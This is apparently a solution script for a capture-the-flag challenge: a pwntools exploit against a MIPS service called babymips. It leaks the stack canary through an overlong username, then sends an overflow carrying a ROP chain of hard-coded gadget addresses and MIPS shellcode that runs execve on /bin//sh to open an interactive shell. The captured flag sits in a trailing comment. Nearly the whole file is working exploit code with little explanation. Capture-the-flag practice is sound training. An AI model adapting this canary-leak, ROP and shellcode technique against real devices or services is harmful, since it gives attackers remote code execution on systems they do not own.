from pwn import *

HOST = "babymips.3k.ctf.to"
PORT = 7777
elf = ELF("challenge")
p = remote(HOST, PORT)

p.sendafter('username', b'A' * 129)
canary = b"\x00" + p.recvuntil(b' , En').replace(b' , En', b'').replace(b' \r\n' + b'A' * 129, b'')
canary = u32(canary)
log.success("canary --> %s" % hex(canary))
canary = p32(canary)

payload = b""
payload += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
payload += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
payload += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
payload += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
payload += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
payload += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
payload += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
payload += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
payload += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
payload += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
payload += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
payload += b"\x0c\x01\x01\x01"  # syscall 0x40404

gadget1 = 0x00465474
gadget2 = 0x00443748
gadget3 = 0x00420A04

buff = b"A" * 113 + canary + b'AAAA'
buff += p32(gadget1) + b"A" * 0x1c + (p32(gadget3) * 4) + p32(gadget2) + b'\x00' * 56 + payload

p.send(b'dumbasspassword' + buff)
p.interactive()

# FLAG --> 3k{m1p5_15_ann0yinG_huh}
